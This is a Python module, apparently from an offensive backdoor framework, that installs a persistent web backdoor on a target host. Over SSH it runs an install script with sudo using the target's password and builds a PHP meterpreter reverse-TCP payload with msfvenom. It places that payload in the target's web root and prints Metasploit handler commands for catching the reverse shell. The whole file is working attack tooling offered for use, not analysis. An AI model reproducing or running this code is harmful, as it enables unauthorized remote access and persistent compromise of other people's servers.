from backdoor import *

class Web(Backdoor):
    prompt = Fore.RED + "(web) " + Fore.BLUE + ">> " + Fore.RESET

    def __init__(self, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using Web module"
        self.core = core
        self.options = {
                "port"   : Option("port", 53929, "port to connect to", True),
                "name"   : Option("name", "backdoor.php", "name of backdoor", True),
		}
        self.allow_modules = True
        self.modules = {}
        self.help_text = "" 

    def get_command(self):
        return "echo " + self.core.curtarget.pword + " | sudo -S php /var/www/html/" + self.get_value("name")

    def do_exploit(self, args):
        port = self.get_value("port")
        name = self.get_value("name")
        target = self.core.curtarget
        target.scpFiles(self, "auxiliary/web/install.sh", False)
        target.ssh.exec_command("echo " + target.pword + " | sudo -S bash install.sh")
        print(GOOD + "Starting Apache server on target...")
        os.system("msfvenom -p php/meterpreter_reverse_tcp LHOST=" + self.core.localIP + " LPORT=" + str(port) + " -f raw > " + name) 
        print(GOOD + "Creating backdoor...")
        target.scpFiles(self, name, False)
        print(GOOD + "Shipping backdoor...")
        target.ssh.exec_command("echo " + target.pword + " | sudo -S rm /var/www/html/" + name)
        target.ssh.exec_command("echo " + target.pword + " | sudo -S mv " + name + " /var/www/html")
        print("Start a handler with metasploit using the following commands: ")
        print("> use exploit/multi/handler")
        print("> set PAYLOAD php/meterpreter_reverse_tcp")
        print("> set LHOST " + self.core.localIP)
        print("> set LPORT " + str(port))
        print("> exploit\n")
        print("Then visit the site at " + target.hostname + "/" + name)
        print("To begin your session, type sessions -i [session id]")
        for mod in self.modules.keys():
            print(INFO + "Attempting to execute " + mod.name + " module...")
            mod.exploit()
  
